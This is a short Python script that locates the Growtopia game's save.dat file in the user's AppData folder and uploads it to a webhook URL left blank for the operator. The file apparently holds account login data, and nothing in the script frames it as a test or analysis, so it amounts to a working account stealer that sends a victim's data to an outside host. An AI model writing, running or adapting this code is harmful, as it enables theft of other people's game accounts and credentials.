import os
import requests

# Replace with the webhook URL you obtained
webhook_url = ''

# Specify the path to the file you want to send
file_path = 'AppData\\Local\\Growtopia\\save.dat'

# Combine the user's home directory with the relative file path
user_home = os.path.expanduser("~")
file_path = os.path.join(user_home, file_path)

# Check if the file exists
if os.path.isfile(file_path):
    # Create a dictionary with the file content to send
    files = {'file': open(file_path, 'rb')}

    # Send the file to the webhook
    response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        print("File sent successfully.")
    else:
        print(f"Failed to send the file. Status code: {response.status_code}")
else:
    print(f"File '{file_path}' not found.")
